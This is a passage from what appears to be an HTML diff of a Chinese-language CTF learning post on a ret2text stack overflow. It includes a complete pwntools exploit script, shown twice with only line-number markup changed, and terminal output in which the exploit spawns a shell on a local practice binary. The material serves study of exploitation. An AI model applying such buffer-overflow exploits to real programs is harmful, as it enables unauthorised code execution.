+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kira㉿kali<span class="o">)</span>-<span class="o">[</span>~/Sec/PWN/Stack<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python3 exp_ret2text.py                                                       
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./ret2text&#39;</span>: pid <span class="m">897972</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/kali/Sec/PWN/Stack/ret2text&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">exp_ret2text.py  pwndbg  ret2libc1  ret2libc2  ret2text
+</span></span><span class="line"><span class="cl">$ whoami
+</span></span><span class="line"><span class="cl">kira
 </span></span></code></pre></div><h2 id="exp">EXP</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># 运行这个本地程序</span>
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2text&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"># 接收输出</span>
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1"># payload = b&#39;A&#39;*20 + p32(0x08048522)</span>
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"># 不建议使用IDA去获得地址，因为嘛= =还是尽可能用代码操作</span>
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2text&#34;</span><span class="p">)</span> <span class="c1"># 读取文件的信息</span>
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">get_shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;get_shell&#34;</span><span class="p">]</span> <span class="c1"># 搜索&#34;符号&#34;get_shell</span>
-</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_shell</span><span class="p">)</span> 
-</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#投喂数据(虽说是恶意数据)</span>
-</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  <span class="c1">#切换到交互模式</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 运行这个本地程序</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2text&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 接收输出</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># payload = b&#39;A&#39;*20 + p32(0x08048522)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 不建议使用IDA去获得地址，因为嘛= =还是尽可能用代码操作</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;ret2text&#34;</span><span class="p">)</span> <span class="c1"># 读取文件的信息</span>
+</span></span><span class="line"><span class="cl"><span class="n">get_shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;get_shell&#34;</span><span class="p">]</span> <span class="c1"># 搜索&#34;符号&#34;get_shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_shell</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#投喂数据(虽说是恶意数据)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  <span class="c1">#切换到交互模式</span>
 </span></span></code></pre></div><h2 id="ref">Ref</h2>
 <p><a class="link" href="https://blog.csdn.net/weixin_43833642/article/details/104175028"  target="_blank" rel="noopener"
     >https://blog.csdn.net/weixin_43833642/article/details/104175028</a></p>
